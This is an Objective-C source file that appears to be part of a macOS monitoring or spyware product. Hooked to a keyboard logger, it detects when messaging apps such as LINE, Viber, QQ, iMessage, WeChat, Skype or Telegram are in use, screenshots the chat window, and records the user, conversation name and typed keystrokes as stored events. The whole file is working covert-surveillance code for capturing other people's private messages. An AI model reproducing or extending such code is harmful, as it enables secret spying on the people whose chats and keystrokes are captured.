//
//  IMCaptureManagerForMac.m
//  IMCaptureManagerForMac
//
//  Created by Makara Khloth on 2/9/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "IMCaptureManagerForMac.h"
#import "IMWindowTitleUtils.h"

#import "KeyboardLoggerManager.h"
#import "KeyStrokeInfo.h"
#import "DateTimeFormat.h"
#import "FxIMMacOSEvent.h"
#import "SystemUtilsImpl.h"
#import "PrefEventsCapture.h"

@interface IMCaptureManagerForMac (private)
- (void) captureIMWithKeyStroke: (KeyStrokeInfo *) aKeyStroke
                      serviceID: (FxIMServiceID) aServiceID
               inactiveBundleID: (NSString *) aBundleID
                         window: (NSWindow *) aWindow;
- (FxIMServiceID) getIMServiceID: (NSString *) aBundleID;
- (NSString *) windowTitleWithBundleID: (NSString *) aBundleID windowID: (NSNumber *) aWindowID;
- (NSString *) windowShotFilePathWithPrefix: (NSString *) aPrefix;
- (void) storeEvent: (FxEvent *) aEvent;
@end

@implementation IMCaptureManagerForMac

@synthesize mIndividualIM;

- (id) initWithAttachmentFolder: (NSString *) aAttachmentFolder
          keyboardLoggerManager: (KeyboardLoggerManager *) aKeyboardLoggerManager {
    
    self = [super init];
    if (self) {
        mAttachmentFolder = [aAttachmentFolder retain];
        mKeyboardLoggerManager = aKeyboardLoggerManager;
        self.mIndividualIM = kPrefIMIndividualNone;
    }
    return (self);
}

#pragma mark - Event delegate -

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture {
    DLog(@"Start capture IM for Mac");
    [mKeyboardLoggerManager removeObserver:self];
    [mKeyboardLoggerManager addObserver:self];
}

- (void) stopCapture {
    DLog(@"Stop capture IM for Mac");
    [mKeyboardLoggerManager removeObserver:self];
    self.mIndividualIM = kPrefIMIndividualNone;
}

#pragma mark - KeyboardLoggerManager delegate -

- (void) mouseClickDetected: (KeyStrokeInfo *) aKeyStrokeInfo mouseEvent: (NSEvent *) aEvent {
    DLog(@"Mouse click event = %@, mAppBundle = %@", aEvent, [aKeyStrokeInfo mAppBundle]);
    
    /*
     When mouse clicked on IM window -> no problem, but if click on another app's window -> capture wrong screen
     thus we need to pass aKeyStrokeInfo's bundle ID to inactiveBundleID to make sure we capture correct screen
    */
    
    FxIMServiceID serviceID = [self getIMServiceID:[aKeyStrokeInfo mAppBundle]];
    DLog(@"serviceID %d",serviceID);
    if (serviceID != kIMServiceUnknown) {
        [self captureIMWithKeyStroke:aKeyStrokeInfo
                           serviceID:serviceID
                    inactiveBundleID:[aKeyStrokeInfo mAppBundle]
                              window:[aEvent window]];
    }
}

- (void) terminateKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo keySymbol: (NSString *) aSymbol {
    DLog(@"Terminated key symbol = %@, mAppBundle = %@", aSymbol, [aKeyStrokeInfo mAppBundle]);
    FxIMServiceID serviceID = [self getIMServiceID:[aKeyStrokeInfo mAppBundle]];
    if (serviceID != kIMServiceUnknown) {
        [self captureIMWithKeyStroke:aKeyStrokeInfo
                           serviceID:serviceID
                    inactiveBundleID:nil
                              window:nil];
    }
}

- (void) activeAppChangeKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo inactiveBundleID: (NSString *) aBundleID {
    DLog(@"Inactive application bundle ID = %@, mAppBundle = %@", aBundleID, [aKeyStrokeInfo mAppBundle]);
    
    /*
     activeAppChangedKeyDetected always call and mouseClickDetected never call in case mouse click event on another app's window
     */
    
    FxIMServiceID serviceID = [self getIMServiceID:[aKeyStrokeInfo mAppBundle]];
    if (serviceID != kIMServiceUnknown) {
        [self captureIMWithKeyStroke:aKeyStrokeInfo
                           serviceID:serviceID
                    inactiveBundleID:aBundleID
                              window:nil];
    }
}

#pragma mark - Private methods -

- (void) captureIMWithKeyStroke: (KeyStrokeInfo *) aKeyStroke
                      serviceID: (FxIMServiceID) aSericeID
               inactiveBundleID: (NSString *) aBundleID
                         window: (NSWindow *) aWindow {
    DLog(@"#### CaptureIMWithKeyStroke");
    /*
     Block variable is not retain in Manual Reference Counting
     http://stackoverflow.com/questions/17384599/why-are-block-variables-not-retained-in-non-arc-environments
     */
    
    KeyStrokeInfo *keyStroke = [aKeyStroke retain];
    NSString *inactiveBundleID = [aBundleID retain];
    NSString *filePath = [[self windowShotFilePathWithPrefix:[aKeyStroke mAppBundle]] retain];
    
    NSThread *threadA = [NSThread currentThread];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    //dispatch_async(dispatch_get_main_queue(), ^{
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        
        // Waiting for IM screen is redrawn
        [NSThread sleepForTimeInterval:1.0];
        
        NSString *bundleID = [keyStroke mAppBundle];
        NSImage *screenshot = nil;
        if (inactiveBundleID == nil) {
            screenshot = [SystemUtilsImpl takeScreenshotFrontWindow];
            //screenshot = [SystemUtilsImpl takeScreenshotFrontAllWindows];
        } else {
            bundleID = inactiveBundleID;
            //screenshot = [SystemUtilsImpl takeScreenshotFrontWindowWithBundleID:inactiveBundleID];
            screenshot = [SystemUtilsImpl takeScreenshotWithBundleID:inactiveBundleID windowID:[aKeyStroke mFrontmostWindow]];
        }
        DLog(@"====> screenshot     = %@", screenshot);
        DLog(@"====> mAppName       = %@", [keyStroke mAppName]);
        DLog(@"====> mWindowTitle   = %@", [keyStroke mWindowTitle]);
        
        if (screenshot) {
            NSString *title = [self windowTitleWithBundleID:bundleID windowID:[aKeyStroke mFrontmostWindow]];
            NSString *convName =  title;
            if (!convName || [convName length] == 0) {
                convName = ([[keyStroke mWindowTitle] length] > 0) ? [keyStroke mWindowTitle] : [keyStroke mAppName];
            }
            
            NSData *tiffData = [screenshot TIFFRepresentation];
            NSBitmapImageRep *bitmap = [NSBitmapImageRep imageRepWithData:tiffData];
            [bitmap setSize:[screenshot size]];
            NSData *pngData = [bitmap representationUsingType:NSPNGFileType properties:nil];
            [pngData writeToFile:filePath atomically:YES];
            
            FxIMMacOSEvent *imEvent = [[[FxIMMacOSEvent alloc] init] autorelease];
            [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [imEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
            [imEvent setMApplicationID:[keyStroke mAppBundle]];
            [imEvent setMApplicationName:[keyStroke mAppName]];
            [imEvent setMTitle:[keyStroke mWindowTitle]];
            [imEvent setMIMServiceID:aSericeID];
            [imEvent setMConversationName:convName];
            [imEvent setMKeyData:[keyStroke mKeyStrokeDisplay]];
            [imEvent setMSnapshotFilePath:filePath];
            
            DLog(@"===================== *** =======================");
            DLog(@"date time: %@", [imEvent dateTime]);
            DLog(@"user log on: %@", [imEvent mUserLogonName]);
            DLog(@"application ID: %@", [imEvent mApplicationID]);
            DLog(@"application name: %@", [imEvent mApplicationName]);
            DLog(@"title: %@", [imEvent mTitle]);
            DLog(@"service ID: %d", [imEvent mIMServiceID]);
            DLog(@"conversation name: %@", [imEvent mConversationName]);
            DLog(@"key data: %@", [imEvent mKeyData]);
            DLog(@"snap shot file path: %@", [imEvent mSnapshotFilePath]);
            DLog(@"===================== *** =======================");
            
            [self performSelector:@selector(storeEvent:) onThread:threadA withObject:imEvent waitUntilDone:NO];
        } else {
            DLog(@"--------> CANNOT take screenshot");
        }
        
        [pool release];
        
        [filePath release];
        [inactiveBundleID release];
        [keyStroke release];
    });
}

- (FxIMServiceID) getIMServiceID: (NSString *) aBundleID {
    DLog(@"### aBundleID %@",aBundleID);
    FxIMServiceID serviceID = kIMServiceUnknown;
    NSUInteger individualIM = self.mIndividualIM;
    if ([aBundleID isEqualToString:@"jp.naver.line.mac"] && (individualIM & kPrefIMIndividualAppShotLINE)) {
        serviceID = kIMServiceLINE;
    } else if ([aBundleID isEqualToString:@"com.viber.osx"] && (individualIM & kPrefIMIndividualAppShotViber)) {
        serviceID = kIMServiceViber;
    } else if ([aBundleID isEqualToString:@"com.tencent.qq"] && (individualIM & kPrefIMIndividualAppShotQQ)) {
        serviceID = kIMServiceTencentQQ;
    } else if ([aBundleID isEqualToString:@"com.apple.iChat"] && (individualIM & kPrefIMIndividualAppShotIMessage)) {
        serviceID = kIMServiceiMessage;
    } else if ([aBundleID isEqualToString:@"com.tencent.xinWeChat"] && (individualIM & kPrefIMIndividualAppShotWeChat)) {
        serviceID = kIMServiceWeChat;
    } else if ([aBundleID isEqualToString:@"com.skype.skype"] && (individualIM & kPrefIMIndividualAppShotSkype)) {
        serviceID = kIMServiceSkype;
    } else if ([aBundleID isEqualToString:@"com.aim.chromely.aim"] && (individualIM & kPrefIMIndividualAppShotAIM)) {
        serviceID = kIMServiceAIM;
    } else if ([aBundleID isEqualToString:@"com.ceruleanstudios.trillian.osx"] && (individualIM & kPrefIMIndividualAppShotTrillian)) {
        serviceID = kIMServiceTrillian;
    }
    else if ( ([aBundleID isEqualToString:@"ru.keepcoder.Telegram"] || [aBundleID isEqualToString:@"org.telegram.desktop"]) && (individualIM & kPrefIMIndividualAppShotTelegram) ) {
        serviceID = kIMServiceTelegram;
    }
    return (serviceID);
}
                   
- (NSString *) windowTitleWithBundleID: (NSString *) aBundleID windowID: (NSNumber *) aWindowID {
    /*
     - No need to parse UI elements for line
     - Cannot parse element for WeChat & AIM
     */
    
    NSString *title = nil;
    if ([aBundleID isEqualToString:@"jp.naver.line.mac"]) {
        //title = [IMWindowTitleUtils lineWindowTitle];
    } else if ([aBundleID isEqualToString:@"com.viber.osx"]) {
        //title = [IMWindowTitleUtils viberWindowTitle];
        title = [IMWindowTitleUtils viberWindowTitle:aWindowID];
        if (!title) {
            //title = [IMWindowTitleUtils viberWindowTitle5_0_1];
            title = [IMWindowTitleUtils viberWindowTitle5_0_1:aWindowID];
        }
    } else if ([aBundleID isEqualToString:@"com.tencent.qq"]) {
        //title = [IMWindowTitleUtils qqWindowTitle];
        title = [IMWindowTitleUtils qqWindowTitle:aWindowID];
        if (!title) {
            title = [IMWindowTitleUtils qqWindowTitle4_0_2:aWindowID];
        }
    } else if ([aBundleID isEqualToString:@"com.apple.iChat"]) {
        //title = [IMWindowTitleUtils iMessagesWindowTitle];
        title = [IMWindowTitleUtils iMessagesWindowTitle:aWindowID];
    } else if ([aBundleID isEqualToString:@"com.tencent.xinWeChat"]) {
        //title = [IMWindowTitleUtils wechatWindowTitle];
    } else if ([aBundleID isEqualToString:@"com.skype.skype"]) {
        //title = [IMWindowTitleUtils skypeWindowTitle];
        title = [IMWindowTitleUtils skypeWindowTitle:aWindowID];
    } else if ([aBundleID isEqualToString:@"com.aim.chromely.aim"]) {
        //title = [IMWindowTitleUtils aimWindowTitle];
    } else if ([aBundleID isEqualToString:@"com.ceruleanstudios.trillian.osx"]) {
        //title = [IMWindowTitleUtils trillianWindowTitle];
        title = [IMWindowTitleUtils trillianWindowTitle:aWindowID];
    }
    else if ([aBundleID isEqualToString:@"ru.keepcoder.Telegram"]) {
        title = [IMWindowTitleUtils telegramWindowTitle:aWindowID];
    } else if ([aBundleID isEqualToString:@"org.telegram.desktop"]) {
        
    }

    DLog(@"Title of %@: %@", aBundleID, title);
    return (title);
}

- (NSString *) windowShotFilePathWithPrefix: (NSString *) aPrefix {
    NSString *formatString = @"yyyy-MM-dd_HH-mm-ss-SSS";
    NSDateFormatter *dateFormatter = [[[NSDateFormatter alloc] init] autorelease];
    [dateFormatter setDateFormat:formatString];
    NSString *filePath = [NSString stringWithFormat:@"%@%@_%@.png", mAttachmentFolder, aPrefix, [dateFormatter stringFromDate:[NSDate date]]];
    return (filePath);
}

- (void) storeEvent: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

- (NSImage *)windowImage: (NSWindow *) aWindow
{
    NSImage * image = [[NSImage alloc] initWithCGImage:[self windowImageShot:aWindow] size:[aWindow frame].size];
    //[image setDataRetained:YES];
    [image setCacheMode:NSImageCacheNever];
    return [image autorelease];
}

- (CGImageRef)windowImageShot: (NSWindow *) aWindow
{
    CGWindowID windowID = (CGWindowID)[aWindow windowNumber];
    CGWindowImageOption imageOptions = kCGWindowImageDefault;
    CGWindowListOption singleWindowListOptions = kCGWindowListOptionIncludingWindow;
    CGRect imageBounds = CGRectNull;
    
    CGImageRef windowImage = CGWindowListCreateImage(imageBounds, singleWindowListOptions, windowID, imageOptions);
    
    return (CGImageRef)[NSMakeCollectable(windowImage) autorelease];
}

- (void) dealloc {
    [self stopCapture];
    [mAttachmentFolder release];
    [super dealloc];
}

@end
